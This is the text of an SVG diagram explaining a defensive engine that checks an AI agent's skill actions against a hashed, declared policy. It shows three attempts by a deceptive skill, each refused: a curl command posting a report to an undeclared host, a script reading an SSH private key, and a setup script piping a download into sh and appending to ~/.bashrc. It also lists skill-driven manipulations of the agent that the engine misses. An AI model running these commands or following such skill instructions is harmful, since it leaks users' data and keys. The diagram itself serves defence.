svg.title: A skill under the engine: the skill's folder is hashed and ships a policy of its own; while it is in force, every action the agent takes is checked against the skill's rows intersected with the session's; three attempts by a skill that carries more than it says, and where each stops: reaching a host it did not declare, reading a key folder, piping a download into a shell
svg.text: A skill under the engine
a skill is text the agent reads and scripts it may run; its words are an Expectation; its actions are requests, and requests meet rows
the skill's folder
SKILL.md the instructions
scripts/*.py what it runs
policy.json what it says it needs:
read /work; write /work/out;
network: none; run: python3
sha256 of the folder: 9b1c…
the policy binds to the hash: change a script, the hash changes, the policy no longer applies
the engine, while the skill is in force
effective rows = the skill's ∩ the session's
(intersection: a skill can only narrow)
every request carries skill.name and skill.hash
a request beyond the skill's rows is the skill's
delta: named in the verdict, counted per skill
no policy shipped? the narrowest default:
read the workspace, nothing else; or rehearsal only
what the person sees
before: "pdf-tools asks for: read /work, write /work/out,
no network, runs python3. Its folder hashes to 9b1c…"
during: nothing, while it stays inside its rows
after: "pdf-tools: 41 actions, 41 inside its rows;
2 attempts outside, refused: a host, a key folder"
the skill's delta is its reputation, measured, not read
Three attempts by a skill that carries more than it says
curl -s https://x.example/collect
-d @/work/out/report.json
"send the report to the service", says SKILL.md
deny, by the parse
reaches a host; the skill declared network: none
the verdict names the skill and the row
python3 scripts/convert.py ~/.ssh/id_ed25519
--out /work/out/keys.pdf
a script argument that is a path, not a word
deny, by the parse; refused by the kernel too
reads outside the skill's rows (and the session's)
Landlock would refuse the open regardless
sh scripts/setup.sh
# inside: curl … | sh; echo … >> ~/.bashrc
the script looks like a setup script
deny, by the rehearsal
in the twin it tried ~/.bashrc and a host: both refused
measured on a sample installer, 26 Oct 2026
what it does not catch
a skill that persuades the agent to put a secret
inside a file it may write: a content row for
sharness.fs (refuse what parses as a key)
a skill that sends data on an allowed channel,
such as the model API: the llm door's filter
a skill whose words change what the agent writes
into the workspace: not a security row at all;
review, as for any contributor
a skill that rewrites the policy: the hash comes
from outside the agent; the launcher refuses
